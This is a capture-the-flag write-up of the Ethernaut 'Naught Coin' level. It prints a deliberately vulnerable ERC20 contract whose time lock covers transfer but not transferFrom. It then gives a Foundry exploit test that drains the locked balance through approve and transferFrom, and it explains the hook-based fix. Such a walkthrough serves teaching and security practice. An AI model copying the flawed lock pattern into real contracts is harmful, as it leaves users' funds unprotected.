---
title: 'Ethernaut Challenge #15 Solution — Naught Coin'
excerpt: This is Part 14 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>We have tons of `NaughtCoin` tokens in our balance but we cannot withdraw them for **10 years**. The goal of this challenge is to find a way to withdraw them skipping the lock period.
coverImage:
  url: '/assets/blog/ethernaut/naught-coin.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-01T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/naught-coin.svg'
---

This is Part 15 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.medium.com/lets-play-ethernaut-ctf-learning-solidity-security-while-playing-1678bd6db3c4) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #15: Naught Coin

> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
>
> Things that might help
>
> - The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
> - The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase
>
> Level author(s): [Kyle Riley](https://github.com/syncikin)

We have tons of `NaughtCoin` tokens in our balance but we cannot withdraw them for **10 years**. The goal of this challenge is to find a way to withdraw them skipping the lock period.

## Study the contracts

Let's review the contract code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = now + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) public ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(now > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

The contract is pretty simple. In the `constructor` the Contract mint to the `player` address `1_000_000` tokens.

> **Note:** there's a double event emission in the `constructor`. After the `_mint` execution the contract `emit` a `Transfer` event without knowing that the native implementation of the OpenZeppelin `_mint` function already `emit` a `Transfer` event.

The contract is overriding the `transfer` function by adding the `lockTokens` function modifier to the `ERC20` implementation. Let's see what this modifier do:

```solidity
// Prevent the initial owner from transferring tokens until the timelock has passed
modifier lockTokens() {
    if (msg.sender == player) {
        require(now > timeLock);
        _;
    } else {
        _;
    }
}
```

The modifier check if the `msg.sender` is the `player` and if that's the case it check if at least `10 years` have passed since the minting time.

**Are our precious tokens stuck for 10 years?**

To solve this contract we need to know how the EIP (Ethereum Improvement Proposal) for the ERC20 token works and how OpenZeppelin has implemented it (the contract is using the OpenZeppelin framework library).

You can find all the informations needed from these links:

- [Ethereum EIP-20](https://eips.ethereum.org/EIPS/eip-20)
- [OpenZeppelin ERC20 Docs](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20)
- [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)

There are two way to transfer tokens:

- via the `transfer` function that allow the `msg.sender` to directly transfer tokens to a `recipient`
- via the `transferFrom` that allows an external arbitrary `sender` (that could be the owner of the tokens itself) to transfer on behalf of the owner an `amount` of tokens to a `recipient`. Before sending those tokens the owner must have **approved** the `sender` to manage that amount of tokens

Because the `transfer` method has been `overrided` by the `NaughtCoin` contract we can circumvent the restriction by using the `transferFrom` function.

Here's what we need to do:

1. Create a secondary account to transfer all our tokens to
2. Approve ourself to manage the whole amount of tokens before calling `transferFrom`
3. Call `transferFrom(player, secondaryAccount, token.balanceOf(player))`
4. Use the tokens however we want!

What should the `NaughtCoin` countract have implemented to really lock our token for **10 years**? Instead of `overriding` the `transfer` function they could have implemented an **hook** that the EIP-20 define called `_beforeTokenTransfer`.

This hook is called when any kind of token transfer happen:

- `mint` (transfer from `0x` address to the user)
- `burn` (transfer from the user to `0x` address)
- `transfer`
- `transferFrom`

By doing so they would have prevented this exploit.

## Solution code

The solution is really easy to implement:

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Create a secondary account to transfer all our tokens to
    address payable tempUser = utilities.getNextUserAddress();
    vm.deal(tempUser, 1 ether);

    // Get the balance of tokens for the player
    uint256 playerBalance = level.balanceOf(player);

    // Approve ourself to manage the whole amount of tokens before calling `transferFrom`
    level.approve(player, playerBalance);

    // Transfer all the tokens from the player balance to the secondary account
    level.transferFrom(player, tempUser, playerBalance);

    vm.stopPrank();

    // Assert that the player has no more tokens
    assertEq(level.balanceOf(player), 0);

    // Assert that the secondary account received all the tokens
    assertEq(level.balanceOf(tempUser), playerBalance);
}
```

You can read the full solution of the challenge opening [NaughtCoin.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/NaughtCoin.t.sol)

## Further reading

- [Ethereum EIP-20](https://eips.ethereum.org/EIPS/eip-20)
- [OpenZeppelin ERC20 Docs](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20)
- [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
